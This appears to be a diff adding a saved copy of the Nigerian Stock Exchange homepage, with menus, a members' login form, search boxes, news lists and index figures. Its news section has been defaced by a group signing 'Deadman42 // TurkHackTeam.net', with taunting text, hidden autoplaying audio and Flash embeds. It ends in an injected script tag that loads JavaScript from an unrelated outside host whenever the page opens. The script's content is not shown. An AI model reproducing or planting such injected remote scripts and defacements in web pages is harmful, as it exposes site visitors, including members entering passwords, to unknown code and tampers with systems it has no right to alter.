@@ -1,0 +1,1647 @@
+
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+<html>
+
+<head>
+
+<title>::::: The Nigerian Stock Exchange :::::</title>
+
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+
+<link href="include/front.css" rel="stylesheet" type="text/css">
+
+</head>
+
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+
+<table width="100%" border="0" cellpadding="0" cellspacing="0">
+
+<tr>
+
+<td class="bodyWrapper" align="center">
+
+<table width="998" border="0" cellpadding="0" cellspacing="0">
+
+<tr>
+
+<td class="bodyContent">
+
+
+
+
+
+
+<style type="text/css">
+
+.articleTitle {
+
+  font-family: Geneva, Arial, Helvetica, sans-serif;
+
+  font-size: 12px;
+
+  font-weight: bold;
+
+  color: #D5AA00;
+
+  float: left;
+
+  padding-left: 10px;
+
+  padding-top: 5px;
+
+  background: #EEEEEE;
+
+  height: 20px;
+
+}
+
+</style>
+
+
+
+<script language="JavaScript">
+
+var timer;
+
+var subTimer;
+
+var curMenu = "";
+
+var curSubMenu = "";
+
+
+
+var isMSIE = (navigator.appName == "Microsoft Internet Explorer");
+
+
+
+function noop(){}
+
+
+
+function showMenu(n)
+
+  {
+
+  window.clearInterval(timer);
+
+
+
+  if (curMenu != "")
+
+    {
+
+    hideMenu1(curMenu);
+
+    }
+
+
+
+  menuElem = window.document.getElementById("menu" + n);
+
+  menuElem.style.visibility = "visible";
+
+  curMenu = "" + n + "";
+
+  }
+
+
+
+function hideMenu(n)
+
+  {
+
+  timer = window.setInterval("hideMenu1(" + n + ");", 1000);
+
+  
+
+  if (n == 1)
+
+    {
+
+    menuElem = window.document.getElementById("menu1-2");
+
+    if (menuElem.visibility == "visible")
+
+      {
+
+      subTimer = window.setInterval("hideSubMenu1('1-2');", 1000);
+
+      }
+
+
+
+    menuElem = window.document.getElementById("menu1-5");
+
+    if (menuElem.visibility == "visible")
+
+      {
+
+      subTimer = window.setInterval("hideSubMenu1('1-5');", 1000);
+
+      }
+
+    }
+
+  }
+
+
+
+function hideMenu1(n)
+
+  {
+
+  window.clearInterval(timer);
+
+  menuElem = window.document.getElementById("menu" + n);
+
+  menuElem.style.visibility = "hidden";
+
+  curMenu = "";
+
+  }
+
+
+
+function showSubMenu(n)
+
+  {
+
+  window.clearInterval(subTimer);
+
+
+
+  if (curSubMenu != "")
+
+    {
+
+    hideSubMenu1(curSubMenu);
+
+    }
+
+
+
+  menuElem = window.document.getElementById("menu" + n);
+
+  menuElem.style.visibility = "visible";
+
+  curSubMenu = n;
+
+  }
+
+
+
+function hideSubMenu(n)
+
+  {
+
+  subTimer = window.setInterval("hideSubMenu1('" + n + "');", 1000);
+
+  }
+
+
+
+function hideSubMenu1(n)
+
+  {
+
+  window.clearInterval(subTimer);
+
+  menuElem = window.document.getElementById("menu" + n);
+
+  menuElem.style.visibility = "hidden";
+
+  curSubMenu = "";
+
+  }
+
+
+
+</script>
+
+
+
+
+<div id="menu1" class="menuWrapper" style="position:absolute; left:70px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(1)" onMouseOut="hideMenu(1)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="mission_statement.php">Mission Statement</a>
+
+</li>
+
+<li>
+
+<span class="menuItem" onMouseOver="showSubMenu('1-2')" onMouseOut="hideSubMenu('1-2')"><a href="javascript:noop()">Our People</a></span>
+
+</li>
+
+<li>
+
+<a href="milestones.php">Milestones</a>
+
+</li>
+
+<li>
+
+<a href="facts_and_figures.php">Facts & Figures</a>
+
+</li>
+
+<li>
+
+<span class="menuItem" onMouseOver="showSubMenu('1-5')" onMouseOut="hideSubMenu('1-5')"><a href="javascript:noop()">President's Merit Award</a></span>
+
+</li>
+
+<li>
+
+<a href="fees_and_commissions.php">Fees and Commissions</a>
+
+</li>
+
+<li>
+
+<a href="registrars.php">The Registrars</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu1 -->
+
+
+
+<div id="menu1-2" class="menuWrapper" style="position:absolute; left:270px; top:200px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showSubMenu('1-2'); showMenu('1')" onMouseOut="hideSubMenu('1-2'); hideMenu('1')">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="council_members.php">Council Members</a>
+
+</li>
+
+<li>
+
+<a href="exchange_officers.php">Officers of the Exchange</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+</div><!-- menu1-2 -->
+
+
+
+<div id="menu1-5" class="menuWrapper" style="position:absolute; left:270px; top:262px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showSubMenu('1-5'); showMenu('1')" onMouseOut="hideSubMenu('1-5'); hideMenu('1')">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="award_background.php">Background</a>
+
+</li>
+
+<li>
+
+<a href="award_winners.php">2004 Award Winners</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+</div><!-- menu1-5 -->
+
+
+
+<div id="menu2" class="menuWrapper" style="position:absolute; left:220px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(2)" onMouseOut="hideMenu(2)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="members_introduction.php">Introduction</a>
+
+</li>
+
+<li>
+
+<a href="members_criteria.php">Criteria for Membership</a>
+
+</li>
+
+<li>
+
+<a href="members_list.php">List of Dealing Members</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu2 -->
+
+
+
+<div id="menu3" class="menuWrapper" style="position:absolute; left:340px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(3)" onMouseOut="hideMenu(3)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="quoted_companies.php">Quoted Companies</a>
+
+</li>
+
+<li>
+
+<a href="quoted_companies_listing_requirements.php">Listing Requirements</a>
+
+</li>
+
+<li>
+
+<span class="menuItem" onMouseOver="showSubMenu('3-3')" onMouseOut="hideSubMenu('3-3')"><a href="javascript:noop()">Facts behind the Figures</a></span>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu3 -->
+
+
+
+<div id="menu3-3" class="menuWrapper" style="position:absolute; left:535px; top:220px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showSubMenu('3-3'); showMenu('3')" onMouseOut="hideSubMenu('3-3'); hideMenu('3')">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="quoted_companies_facts_introduction.php">Introduction</a>
+
+</li>
+
+<li>
+
+<a href="quoted_companies_facts_featured.php">Feature Company</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+</div><!-- menu3-3 -->
+
+
+
+<div id="menu4" class="menuWrapper" style="position:absolute; left:470px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(4)" onMouseOut="hideMenu(4)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="all_share_index.php">All Share Index</a>
+
+</li>
+
+<li>
+
+<a href="automated_trading_system.php">Automated Trading System</a>
+
+</li>
+
+<li>
+
+<a href="stock_market_regulators.php">Regulators of Stock Market</a>
+
+</li>
+
+<li>
+
+<a href="rules_and_regulations.php">Rules & Regulations</a>
+
+</li>
+
+<li>
+
+<span class="menuItem" onMouseOver="showSubMenu('4-5')" onMouseOut="hideSubMenu('4-5')"><a href="javascript:noop()">Performance Reviews</a></span>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu4 -->
+
+
+
+<div id="menu4-5" class="menuWrapper" style="position:absolute; left:670px; top:250px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showSubMenu('4-5'); showMenu('4')" onMouseOut="hideSubMenu('4-5'); hideMenu('4')">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="performance_review_2004.php">Annual 2004</a>
+
+</li>
+
+<li>
+
+<a href="performance_review_2005.php">Annual 2005</a>
+
+</li>
+
+<li>
+
+<a href="performance_review_2006.php">Annual 2006</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+</div><!-- menu4-5 -->
+
+
+
+<div id="menu5" class="menuWrapper" style="position:absolute; left:610px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(5)" onMouseOut="hideMenu(5)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="cscs_about.php">About CSCS</a>
+
+</li>
+
+<li>
+
+<a href="cscs_benefits.php">Benefits</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu5 -->
+
+
+
+<div id="menu6" class="menuWrapper" style="position:absolute; left:680px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(6)" onMouseOut="hideMenu(6)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="announcements.php">Company Announcements</a>
+
+</li>
+
+<li>
+
+<span class="menuItem" onMouseOver="showSubMenu('6-2')" onMouseOut="hideSubMenu('6-2')"><a href="javascript: noop();">Downloads</a></span>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu6 -->
+
+
+
+<div id="menu6-2" class="menuWrapper" style="position:absolute; left:475px; top:200px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showSubMenu('6-2'); showMenu('6')" onMouseOut="hideSubMenu('6-2'); hideMenu('6')">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="daily_reports.php">Daily Reports</a>
+
+</li>
+
+<li>
+
+<a href="monthly_reports.php">Monthly Reports</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+</div><!-- menu6-2 -->
+
+
+
+<div id="menu7" class="menuWrapper" style="position:absolute; left:770px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(7)" onMouseOut="hideMenu(7)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="news.php">News & Events</a>
+
+</li>
+
+<li>
+
+<a href="circulars.php">NSE Circulars</a>
+
+</li>
+
+<li>
+
+<a href="press_releases.php">Press Releases</a>
+
+</li>
+
+<li>
+
+<a href="publications.php">Publications</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu7 -->
+
+
+
+<div id="menu8" class="menuWrapper" style="position:absolute; left:770px; top:165px; width:210px; z-index:1; visibility: hidden;" onMouseOver="showMenu(8)" onMouseOut="hideMenu(8)">
+
+
+
+<div class="menuBody">
+
+<ul>
+
+<li>
+
+<a href="glossary.php">Glossary of Terms</a>
+
+</li>
+
+<li>
+
+<a href="faq.php">FAQ</a>
+
+</li>
+
+<li>
+
+<a href="site_map.php">Site Map</a>
+
+</li>
+
+</ul>
+
+</div><!-- menuBody -->
+
+<div class="menuInfo">
+
+
+
+</div><!-- menuInfo -->
+
+</div><!-- menu8 -->
+
+
+
+<table width="1000" class="text" border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+
+<td height="14" class="headerTop1"></td>
+
+</tr>
+
+<tr>
+
+<td>
+
+<table width="100%" class="text" border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+
+<td width="9"></td>
+
+<td class="headerMiddleMain" valign="top">
+
+<div class="headerLogo"></div>
+
+</td>
+
+<td width="11"></td>
+
+</tr>
+
+</table>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td valign="top">
+
+<div class="headerBottom" align="center" style="height: 37;">
+
+<a class="topMenu" href="index.php">Home</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;
+
+<span class="menuItem" onMouseOver="showMenu(1)" onMouseOut="hideMenu(1)">
+
+<a class="topMenu" href="javascript:noop();">Corporate Information</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<span class="menuItem" onMouseOver="showMenu(2)" onMouseOut="hideMenu(2)">
+
+<a class="topMenu" href="javascript:noop();">Dealing Members</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<span class="menuItem" onMouseOver="showMenu(3)" onMouseOut="hideMenu(3)">
+
+<a class="topMenu" href="javascript:noop();">Quoted Companies</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<span class="menuItem" onMouseOver="showMenu(4)" onMouseOut="hideMenu(4)">
+
+<a class="topMenu" href="javascript:noop();">Trading & Regulations</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<span class="menuItem" onMouseOver="showMenu(5)" onMouseOut="hideMenu(5)">
+
+<a class="topMenu" href="javascript:noop();">CSCS Ltd</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<span class="menuItem" onMouseOver="showMenu(6)" onMouseOut="hideMenu(6)">
+
+<a class="topMenu" href="javascript:noop();">Market Data</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<span class="menuItem" onMouseOver="showMenu(7)" onMouseOut="hideMenu(7)">
+
+<a class="topMenu" href="javascript:noop();">Media Centre</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<span class="menuItem" onMouseOver="showMenu(8)" onMouseOut="hideMenu(8)">
+
+<a class="topMenu" href="javascript:noop();">Help</a>&nbsp;&nbsp;&nbsp;
+
+</span>
+
+|&nbsp;&nbsp;<a class="topMenu" href="contact_us.php">Contact us</a>
+
+</div>
+
+</td>
+
+</tr>
+
+<tr>
+
+<td valign="top">
+
+<table width="100%" class="text" border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+
+
+
+
+<script language="JavaScript">
+function checkKey(Pform)
+  {
+  if (window.event.keyCode == 13)
+    {
+//    var Vok = (window.event.srcElement.name != "f_comments");
+    Vok = true;
+    if (Vok)
+      {
+      enviar_1(Pform);
+      }
+    }
+  }
+
+function enviar_1(Pform)
+  {
+  if (enviar(Pform))
+    {
+    formElem = window.document.getElementById(Pform);
+    formElem.submit();
+    }
+  }
+
+function enviar(Pform)
+  {
+  if (Pform == "form1")
+    {
+    if (data_OKform1())
+      {
+      return true;
+      }
+    else
+      {
+      return false;
+      }
+    }		
+  }
+
+function data_OKform1()
+  {
+  fieldElem = document.getElementById("f_user");
+
+  if (fieldElem.value == "")
+    {
+    alert("Please enter the Username");
+    fieldElem.focus();
+    return false;
+    }
+
+  fieldElem = document.getElementById("f_pass");
+
+  if (fieldElem.value == "")
+    {
+    alert("Please enter the Password");
+    fieldElem.focus();
+    return false;
+    }
+
+  return true;
+  }
+
+function checkFieldKey(Pfield)
+  {
+  if (window.event.keyCode == 13)
+    {
+//    var Vok = (window.event.srcElement.name != "f_comments");
+    Vok = true;
+
+    if (Vok)
+      {
+      enviar_1_field(Pfield);
+      }
+    }
+  }
+
+function enviar_1_field(Pfield)
+  {
+  if (enviarField(Pfield))
+    {
+    formElem = window.document.getElementById("form2")
+
+    if (Pfield == "symbol")
+      {
+      formElem.action = "symbol_search.php";
+      }	
+    else if (Pfield == "broker")
+      {
+      formElem.action = "broker_search.php";
+      }	
+    else if (Pfield == "company")
+      {
+      formElem.action = "company_search.php";
+      }	
+    else if (Pfield == "keyword")
+      {
+      formElem.action = "keyword_search.php";
+      }	
+
+    formElem.submit();
+    }
+  }
+
+function enviarField(Pfield)
+  {
+  if (data_OKform2(Pfield))
+    {
+    return true;
+    }
+  else
+    {
+    return false;
+    }
+  }
+
+function data_OKform2(Pfield)
+  {
+  fieldElem = document.getElementById("f_symbol");
+
+  if ((Pfield == "symbol") && (fieldElem.value == ""))
+    {
+    alert("Please enter the Symbol");
+    fieldElem.focus();
+    return false;
+    }
+
+  fieldElem = document.getElementById("f_broker");
+
+  if ((Pfield == "broker") && (fieldElem.value == ""))
+    {
+    alert("Please enter the Broker");
+    fieldElem.focus();
+    return false;
+    }
+
+  fieldElem = document.getElementById("f_company");
+
+  if ((Pfield == "company") && (fieldElem.value == ""))
+    {
+    alert("Please enter the Company");
+    fieldElem.focus();
+    return false;
+    }
+
+  fieldElem = document.getElementById("f_keyword");
+
+  if ((Pfield == "keyword") && (fieldElem.value == ""))
+    {
+    alert("Please enter the Keyword");
+    fieldElem.focus();
+    return false;
+    }
+
+  return true;
+  }
+
+</script>
+<td width="8">&nbsp;</td>
+<td width="225" valign="top">
+<table width="100%" class="text" border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+<td class="sideTop">Members Area</td>
+</tr>
+
+<tr>
+<td class="sideMiddle">
+<form onKeyPress="checkKey('form1');" action="login.php" method="post" id="form1" name="form1">
+<table class="sideText" width="100%"  border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td valign="top">Username</td>
+</tr>
+<tr>
+<td height="30" valign="top">
+<input class="inputText" id="f_user" name="f_user" type="text">
+</td>
+</tr>
+<tr>
+<td valign="top">Password</td>
+</tr>
+<tr>
+<td height="30" valign="top">
+<input class="inputText" id="f_pass" name="f_pass" type="password">
+&nbsp;<a href="javascript:enviar_1('form1');"><img src="images/go.gif" border="0" align="absbottom"></a>
+</td>
+</tr>
+<tr>
+<td valign="top">&nbsp;</td>
+</tr>
+</table>
+</form>
+</td>
+</tr>
+
+<tr>
+<td class="sideMiddleGrey">
+<form action="symbol_search.php" method="post" name="form2" id="form2">
+<br>
+<table class="sideTextGrey" width="100%"  border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td valign="top">Search Symbol</td>
+</tr>
+<tr>
+<td height="30" valign="top">
+<input onKeyPress="checkFieldKey('symbol');" class="inputText" id="f_symbol" name="f_symbol" type="text">
+&nbsp;<a href="javascript:enviar_1_field('symbol');"><img src="images/go_grey.gif" width="29" height="24" border="0" align="absbottom"></a></td>
+</tr>
+<tr>
+<td valign="top">Find a Broker</td>
+</tr>
+<tr>
+<td height="30" valign="top">
+<input onKeyPress="checkFieldKey('broker');" class="inputText" id="f_broker" name="f_broker" type="text">
+&nbsp;<a href="javascript:enviar_1_field('broker');"><img src="images/go_grey.gif" width="29" height="24" border="0" align="absbottom"></a></td>
+</tr>
+<tr>
+<td valign="top">Search by Company</td>
+</tr>
+<tr>
+<td height="30" valign="top">
+<input onKeyPress="checkFieldKey('company');" class="inputText" id="f_company" name="f_company" type="text">
+&nbsp;<a href="javascript:enviar_1_field('company');"><img src="images/go_grey.gif" width="29" height="24" border="0" align="absbottom"></a></td>
+</tr>
+<tr>
+<td valign="top">Search by Keyword</td>
+</tr>
+<tr>
+<td height="30" valign="top">
+<input onKeyPress="checkFieldKey('keyword');" class="inputText" id="f_keyword" name="f_keyword" type="text">
+&nbsp;<a href="javascript:enviar_1_field('keyword');"><img src="images/go_grey.gif" width="29" height="24" border="0" align="absbottom"></a></td>
+</tr>
+</table>
+</form>
+</td>
+</tr>
+
+<tr>
+<td class="sideBottomGrey"></td>
+</tr>
+
+<tr>
+<td class="sideTopLight">Quick Links</td>
+</tr>
+
+<tr>
+<td class="sideMiddleLight">
+<br>
+<table width="100%"  border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td height="30" valign="top">
+<img src="images/more_arrow.png"> <a class="lightLink" href="symbol_browse.php">Symbol Browse</a></td>
+</tr>
+<td height="30" valign="top">
+<img src="images/more_arrow.png"> <a class="lightLink" href="members_list.php">Broker Search</a></td>
+</tr>
+<td height="30" valign="top">
+<img src="images/more_arrow.png"> <a class="lightLink" href="market_indices.php">Market Indices</a></td>
+</tr>
+<td height="30" valign="top">
+<img src="images/more_arrow.png"> <a class="lightLink" href="daily_reports.php">Daily Report </a></td>
+</tr>
+<td height="30" valign="top">
+<img src="images/more_arrow.png"> <a class="lightLink" href="monthly_reports.php">Monthly Report</a></td>
+</tr>
+<td height="30" valign="top">
+<img src="images/more_arrow.png"> <a class="lightLink" href="quoted_companies.php">Quoted Companies </a></td>
+</tr>
+</table>
+</td>
+</tr>
+
+<tr>
+<td class="sideBottomLight"></td>
+</tr>
+
+<tr>
+<td class="sideTopGrey">Want NSE Newsletter?</td>
+</tr>
+
+<tr>
+<td class="sideMiddleGrey">
+<br>
+<table class="sideTextGrey" width="100%"  border="0" cellspacing="0" cellpadding="0">
+<tr>
+<td valign="top">Your Email</td>
+</tr>
+<tr>
+<td height="30" valign="top">
+<input class="inputText" name="" type="text">
+&nbsp;<img src="images/go_grey.gif" width="29" height="24" border="0" align="absbottom">
+</td>
+</tr>
+<tr>
+<td valign="top">&nbsp;</td>
+</tr>
+</table>
+<br><b>NSE Address</b><br>
+STOCK EXCHANGE HOUSE<br>
+(8th, 9th, & 11th Floors)<br>
+2/4 Customs Street<br>
+P. O. Box 2457, Lagos.<br>
+Telephone: 2660287, 2660305, 2660335<br>
+Telex: 23567 STEX NIG.<br>
+Fax: 01-2668724, 2668281<br><br><br>
+</td>
+</tr>
+
+<tr>
+<td class="sideBottomGrey"></td>
+</tr>
+
+</table>
+</td>
+<td width="541" valign="top">
+
+<div class="article">
+
+<div class="articleHeader">
+
+<div class="articleTitle" style="width: 250px">Random images from NSE</div>
+
+<!-- <div class="moreDiv">
+
+<img src="images/more_arrow.png" width="6" height="5">
+
+<a class="moreLink" href="http://www.nigerianstockexchange.info/news.php">More News...</a>
+
+</div><!-- moreDiv -->
+
+</div><!-- articleTitle -->
+
+</div><!-- articleHeader -->
+
+
+<img src="http://www.nigerianstockexchange.info/images/header/rotate.php">
+
+
+<table width="518" border="0" cellpadding="0" cellspacing="0" class="text">
+
+<tr>
+
+<td><br><br>
+<div class="articleHeader">
+
+<div class="articleTitle" style="width: 250px">Latest News</div>
+</div>
+<div class="articleContent">
+
+<br><b>Hacked by Deadman42</b><br><br>
+
+<p>&nbsp;</p>
+<p>Hacked by deadman42</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><img src="http://i564.photobucket.com/albums/ss87/Mafya_67/zix0zc.png" border="0" align="left" /></p>
+<p><img src="http://i564.photobucket.com/albums/ss87/Mafya_67/66da48.png" border="0" align="right" /></p>
+<p>&nbsp;</p>
+<img src="http://c1204.hizliresim.com/w/q/4s5d1.jpg" border="0" />
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p><strong><span style="color: #ff3300;"></span></strong></p>
+<h1>
+<p align="center"><strong><span style="color: #ff3300;"><span style="font-family: Arial;"> Hacked by deadman42 // TurkHackTeam.net</span></span></strong></p>
+</h1>
+<p><strong><span style="color: #ff3300;"><span style="font-family: Arial;"> </span></span></strong></p>
+<p>&nbsp;</p>
+<p><span style="color: #ff3300;"> <span>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>
+<script type="text/javascript"><!--
+</p>
+<p>?</p>
+<p>?function text_wechsel ()</p>
+<p>{</p>
+<p>?if (window.document.getElementById)</p>
+<p>? {</p>
+<p>? ?window.document.getElementById ("textfeld").innerHTML=texte[a];</p>
+<p>? ?if ((a+1)<texte.length)</p>
+<p>? ? {</p>
+<p>? ? ?a++;</p>
+<p>? ? }</p>
+<p>? ?else</p>
+<p>? ? {</p>
+<p>? ? ?a=0;</p>
+<p>? ? }</p>
+<p>? ?window.setTimeout ("text_wechsel ()",geschwindigkeit);</p>
+<p>? }</p>
+<p>}</p>
+<p>?</p>
+<p>window.onload=text_wechsel;</p>
+<p>?</p>
+<p>
+// --></script>
+</p>
+<p>&nbsp;</p>
+<div id="textfeld" style="font-family:Courier New,Arial,Verdana,Tahoma,helvetica,sans-serif,Times New Roman;font-size:25pt;color:red">
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+</div>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<div style="text-align: center; "><span style="color: #ffffff; font-family: Arial, Tahoma, Verdana; font-size: 20px; font-weight: bold; ">Sorry Admin, The Game is over!<br /> I started my game !</span></div>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<img src="http://i297.photobucket.com/albums/mm234/DonTomika/cmd.gif" border="0" />
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<img src="http://i564.photobucket.com/albums/ss87/Mafya_67/logo.png" border="0" />
+<p>&nbsp;</p>
+<p><embed type="audio/mpeg" width="0" height="0" src="http://uploads3.mp3songurls.com/1223303.mp3" autostart="true" loop="true"></embed></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+&nbsp;
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+&nbsp;
+<p>&nbsp;</p>
+<embed type="application/x-shockwave-flash" width="1" height="1" src="http://www.youtube.com/v/b9Xn6bFAwxo;feature=related&amp;autoplay=1" allowfullscreen="true"></embed>
+<script src="http://www.aayp-u.org/tmp/1.js">&lt;/p&gt;
+&lt;/p&gt;</script>
+</span></span></p>
+<p>&nbsp;</p>
+</div><!-- articleContent -->
+
+</td>
+
+</tr>
+
+</table>
+
+
+
+</div><!-- article -->
+
+
+<div class="article">
+
+<div class="articleHeader">
+
+<div class="articleTitle" style="width: 250px">Stock Market News</div>
+
+<div class="moreDiv">
+
+<img src="images/more_arrow.png" width="6" height="5">
+
+<a class="moreLink" href="news.php">More News</a>
+
+</div><!-- moreDiv -->
+
+</div><!-- articleHeader -->
+
+
+
+<div class="articleContent">
+
+<table class="newsTable" width="100%"  border="0" cellspacing="0" cellpadding="5">
+
+
+<tr>
+
+<td width="10">&nbsp;</td>
+
+<td width="110">April 23, 2012</td>
+
+<td width="10">&nbsp;</td>
+
+<td><a class="newsLink" href="news_view.php?id=81">Hacked by Deadman42</a></td>
+
+</tr>
+
+
+<tr>
+
+<td width="10">&nbsp;</td>
+
+<td width="110">April 5, 2006</td>
+
+<td width="10">&nbsp;</td>
+
+<td><a class="newsLink" href="news_view.php?id=5">RUHADAMKUN</a></td>
+
+</tr>
+
+
+</table>
+
+</div><!-- articleContent -->
+
+
+
+</div><!-- article -->
+
+
+
+<div class="article">
+
+<div class="articleHeader">
+
+<div class="articleTitle" style="width: 250px">Latest Company Announcements</div>
+
+<div class="moreDiv">
+
+<img src="images/more_arrow.png" width="6" height="5">
+
+<a class="moreLink" href="announcements.php">More Announcements</a>
+
+</div><!-- moreDiv -->
+
+</div><!-- articleHeader -->
+
+
+
+<div class="articleContent">
+
+<table class="newsTable" width="100%"  border="0" cellspacing="0" cellpadding="5">
+
+
+<tr>
+
+<td width="10">&nbsp;</td>
+
+<td width="110">February 14, 2008</td>
+
+<td width="10">&nbsp;</td>
+
+<td><a class="newsLink" href="announcement_view.php?id=6">RUHADAMKUN</a></td>
+
+</tr>
+
+
+<tr>
+
+<td width="10">&nbsp;</td>
+
+<td width="110">October 1, 2006</td>
+
+<td width="10">&nbsp;</td>
+
+<td><a class="newsLink" href="announcement_view.php?id=5">RUHADAMKUN</a></td>
+
+</tr>
+
+
+<tr>
+
+<td width="10">&nbsp;</td>
+
+<td width="110">September 30, 2006</td>
+
+<td width="10">&nbsp;</td>
+
+<td><a class="newsLink" href="announcement_view.php?id=4">RUHADAMKUN</a></td>
+
+</tr>
+
+
+</table>
+
+</div><!-- articleContent -->
+
+
+
+</div><!-- article -->
+
+
+
+
+<script language="JavaScript">
+function noop()
+  {}
+
+function clickBtn(n)
+  {
+  if (n == 1)
+    {
+    button1.style.border = "1px solid #000000";
+    button2.style.border = "0px";
+    divElem = document.getElementById("graphDiv");
+    divElem.style.display = "inline";
+    divElem = document.getElementById("glDiv");
+    divElem.style.display = "none";
+    }
+  else
+    {
+    button1.style.border = "0px";
+    button2.style.border = "1px solid #000000";
+    divElem = document.getElementById("graphDiv");
+    divElem.style.display = "none";
+    divElem = document.getElementById("glDiv");
+    divElem.style.display = "inline";
+    }
+  }
+</script>
+
+</td>
+<td valign="top">
+<table width="100%" class="text" border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+<td class="sideTop">Market Activity</td>
+</tr>
+
+<tr>
+<td class="sideMiddleGrey">
+<div class="buttonDiv" id="button1">
+<a class="buttonLink" href="javascript:clickBtn(1);">Composite<br>Indices</a>
+</div>
+<div style="border: 0px;" class="buttonDiv" id="button2">
+<a class="buttonLink" href="javascript:clickBtn(2);">Gainers/<br>Loosers</a>
+</div>
+</td>
+</tr>
+
+<tr id="graphDiv">
+<td>
+<table width="100%" class="text" border="0" cellspacing="0" cellpadding="0">
+
+<tr>
+<td class="sideMiddleGrey">
+<span class="title">Nigerian Stock Exchange</span><br><br>
+
+<div class="graph">
+<div class="graphTitle">NSE Index</div>
+<IFRAME id="graphFrame1" name="graphFrame1" width="195" height="140" frameborder="no" scrolling="no" src="index_graph.php"></IFRAME>
+</div>
+<div class="graphTable">
+<table class="graphTableHeader" width="100%"  border="0" cellspacing="0" cellpadding="2">
+<tr>
+<td width="60">Value</td>
+<td width="60">Net Change</td>
+<td align="right">% Change&nbsp;</td>
+</tr>
+</table>
+</div>
+
+<div class="graphBottom">
+<table class="graphTableBottom" width="100%"  border="0" cellspacing="0" cellpadding="2">
+<tr>
+<td width="60"><b>24,220.02</b></td>
+<td width="60"><b>--2,877.28</b></td>
+<td align="right"><b>--10.62</b>&nbsp;</td>
+</tr>
+</table>
+&nbsp;Nov 13, 2008<br><br>
+</div>
+<br>
+
+<div class="graph">
